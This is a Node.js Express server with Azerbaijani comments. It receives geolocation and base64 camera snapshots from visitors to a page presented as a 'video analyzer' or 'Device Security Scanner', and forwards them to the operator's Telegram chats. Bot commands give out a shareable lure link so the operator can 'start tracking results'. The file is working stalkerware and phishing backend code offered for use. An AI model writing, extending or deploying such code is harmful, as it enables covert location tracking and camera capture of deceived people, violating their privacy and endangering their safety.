// server.js
const express = require('express');
const path = require('path');
const FormData = require('form-data');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS
  ? process.env.TELEGRAM_CHAT_IDS.split(',').map(id => id.trim())
  : [];

if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
  console.error('❌ Telegram token və ya chat ID-lər tapılmadı!');
} else {
  console.log('✅ Telegram token və chat ID-lər uğurla yükləndi.');
  console.log('👥 Adminlər:', TELEGRAM_CHAT_IDS);
}

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// 🔹 Telegrama məlumat göndərmək üçün helper funksiyası
async function sendToTelegram(messageText, imageBuffer = null) {
  for (const chatId of TELEGRAM_CHAT_IDS) {
    // Mətn mesajı
    const msgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });
    if (!msgRes.ok) console.error(`⚠️ Chat ${chatId} üçün mesaj xətası`);

    // Şəkil varsa
    if (imageBuffer) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', imageBuffer, {
        filename: 'capture.jpg',
        contentType: 'image/jpeg'
      });
      form.append('caption', 'Kamera görüntüsü');

      const imgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
      });
      if (!imgRes.ok) console.error(`⚠️ Chat ${chatId} üçün şəkil xətası`);
    }
  }
}

// 🔹 Analiz datalarını qəbul edən endpoint
app.post('/api/send-data', async (req, res) => {
  const { videoUrl, location, image } = req.body;
  console.log(`📩 Yeni məlumat alındı: video=${!!videoUrl}, location=${!!location}, image=${!!image}`);

  try {
    let messageText = `⚡️ *Yeni Analiz Tələbi!* ⚡️\n\n`;
    messageText += `*Girilən URL:* ${videoUrl || 'Təyin edilməyib'}\n`;

    if (location?.latitude && location?.longitude) {
      messageText += `📍 *Lokasiya:* [Xəritədə bax](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
      messageText += `Enlem: ${location.latitude}\nBoylam: ${location.longitude}\n`;
    } else {
      messageText += `📍 Lokasiya əldə edilmədi və ya rədd edildi.\n`;
    }

    // Şəkil varsa, base64-dən buffer-ə
    let imageBuffer = null;
    if (image) {
      const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
      imageBuffer = Buffer.from(base64Data, 'base64');
    }

    await sendToTelegram(messageText, imageBuffer);
    res.json({ ok: true, message: 'Məlumat Telegrama göndərildi.' });

  } catch (err) {
    console.error('❌ Xəta:', err.message);
    res.status(500).json({ message: err.message });
  }
});

// =========================
// 🔹 Telegram Bot Commands
// =========================
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
  const { message } = req.body;
  if (!message || !message.text) return res.sendStatus(200);

  const text = message.text.toLowerCase();
  const chatId = message.chat.id;

  try {
    if (text === '/start') {
      await sendToTelegram(
        `👋 Salam! Bu bot vasitəsilə cihaz və link analizlərini apara bilərsən.\n\nKomandalar:\n/link_al - Öz analiz linkini al\n/haqqinda - Bot haqqında məlumat`
      );
    } else if (text === '/link_al') {
      await sendToTelegram(
        `🔗 *Sənin analiz linkin:* https://video-analyzer-server.onrender.com\nBu linki paylaş və nəticələri izləməyə başla.`
      );
    } else if (text === '/haqqinda') {
      await sendToTelegram(
        `ℹ️ *Device Security Scanner Bot*\n\nBu bot istifadəçilərin cihaz və lokasiya məlumatlarını analiz edərək təhlükəsizlik baxımından qiymətləndirir.\n\nDeveloper: @YOUR_USERNAME`
      );
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('⚠️ Komanda xətası:', err.message);
    res.sendStatus(500);
  }
});

// 🔹 Frontend (index.html)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 Server ${PORT} portunda işləyir`));
